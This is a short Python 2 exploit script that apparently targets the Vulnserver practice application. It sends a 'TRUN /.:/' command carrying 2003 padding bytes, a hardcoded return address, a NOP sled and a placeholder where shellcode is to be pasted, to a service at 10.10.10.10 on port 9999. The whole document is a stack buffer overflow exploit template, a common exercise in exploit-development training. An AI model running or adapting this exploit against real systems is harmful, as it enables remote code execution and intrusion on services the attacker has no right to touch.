#!/usr/bin/python
import sys, socket

overflow = ("Paste the Copied Shellcode")

shellcode = "C" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow
 
try:
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.connect(('10.10.10.10', 9999))
    soc.send(('TRUN /.:/' + shellcode))
    soc.close()
except:
    print "Error: Unable to establish connection with Server"
    sys.exit()
